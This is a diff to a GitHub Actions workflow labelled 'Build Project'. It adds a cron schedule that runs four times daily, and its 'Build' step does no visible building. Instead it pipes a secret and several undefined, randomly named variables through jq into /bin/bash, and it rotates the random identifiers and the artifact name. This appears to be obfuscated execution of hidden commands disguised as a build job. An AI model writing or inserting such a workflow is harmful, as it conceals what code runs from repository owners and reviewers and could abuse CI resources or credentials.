@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '30 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,20 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          idxoh14: ${{ secrets.idxoh14 }}
+          iw63: ${{ secrets.iw63 }}
         run: |
-          printf '%s' "$idxoh14" | jq -r .e55 | /bin/bash
-          printf '%s' "$qgj9863" | jq -r .d827 | /bin/bash
-          echo $h7638 | jq -r .nxw26 | /bin/bash
-          echo $gs181 | jq -r .b2248 | /bin/bash
-          echo $cebye1 | jq -r .gle7829 | /bin/bash
-          printf '%s' "$xifep657" | jq -r .hygo2 | /bin/bash
+          printf '%s' "$iw63" | jq -r .xdnzq79563 | /bin/bash
+          echo $d93713 | jq -r .wwamk6 | /bin/bash
+          printf '%s' "$zf15" | jq -r .uchn7 | /bin/bash
+          echo $b8 | jq -r .jxol918 | /bin/bash
+          printf '%s' "$npvl72" | jq -r .kjcj6 | /bin/bash
+          printf '%s' "$rnr001" | jq -r .ciew84 | /bin/bash
+          printf '%s' "$udm1" | jq -r .eyx69 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: kufhPAPQ
+          name: 595MbFPA
           path: "*.zip"
           retention-days: 1
